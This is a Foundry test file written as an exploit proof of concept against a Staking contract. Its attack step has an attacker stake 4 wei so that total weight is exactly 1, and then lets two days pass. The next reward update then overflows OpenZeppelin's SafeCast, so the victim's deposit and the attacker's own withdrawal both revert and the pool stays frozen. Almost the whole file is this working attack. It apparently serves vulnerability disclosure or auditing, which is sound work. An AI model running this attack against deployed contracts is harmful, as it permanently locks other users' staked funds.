// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/Staking.sol"; // Adjust path to their Staking contract
import "openzeppelin/token/ERC20/ERC20.sol";

// Mock ERC20 Token for testing
contract MockToken is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract StakingSafeCastExploitTest is Test {
    Staking public staking;
    MockToken public token;
    
    address public owner = address(1);
    address public distributor = address(2);
    address public attacker = address(3);
    address public victim = address(4);

    function setUp() public {
        // 1. Deploy contracts
        token = new MockToken();
        staking = new Staking();
        
        // 2. Initialize Staking
        staking.initialize(token, IDistributor(distributor), owner);
        
        // 3. Setup Reward (Simulate a reasonable TVL reward)
        // Let's say the protocol adds 1,000,000 tokens as a reward
        uint256 rewardAmount = 1_000_000 * 1e18;
        token.mint(address(staking), rewardAmount);
        
        vm.prank(owner);
        staking.unpause();
        
        vm.prank(owner);
        staking.setRewardAmount(rewardAmount);

        // 4. Fund attacker and victim
        token.mint(attacker, 1 ether);
        token.mint(victim, 1000 ether);
    }

    function test_brickPool_safeCastOverflow() public {
        // --- THE ATTACK ---
        
        // 1. Attacker stakes "dust" (4 wei) with 0 lockup
        // This makes weight exactly 1 wei (4 * 250 / 1000 = 1)
        vm.startPrank(attacker);
        token.approve(address(staking), 4);
        staking.stake(4, 0);
        vm.stopPrank();

        // Verify totalWeights is exactly 1
        assertEq(staking.totalWeights(), 1, "Total weights should be 1 wei");

        // 2. Fast forward time by 2 days
        // In reality, an attacker just waits.
        vm.warp(block.timestamp + 2 days);

        // --- THE IMPACT (DENIAL OF SERVICE) ---
        
        // 3. A legitimate victim tries to stake 1000 tokens
        vm.startPrank(victim);
        token.approve(address(staking), 1000 ether);
        
        // The transaction will revert inside _updateReward() due to SafeCast
        // Expect the specific OpenZeppelin SafeCast revert
        vm.expectRevert(abi.encodeWithSignature("SafeCastOverflowedUintDowncast(uint8,uint256)", 128, 432000000000000000000000000000000000000)); 
        // Note: The exact number in the error depends on the exact reward rate, 
        // so we can also just use a generic revert expectation if the signature isn't strictly matched:
        // vm.expectRevert();
        
        staking.stake(1000 ether, 0);
        vm.stopPrank();
        
        // 4. Attacker tries to withdraw - they also can't! 
        // The entire protocol is permanently frozen.
        vm.startPrank(attacker);
        vm.expectRevert();
        staking.withdraw(0);
        vm.stopPrank();
    }
}
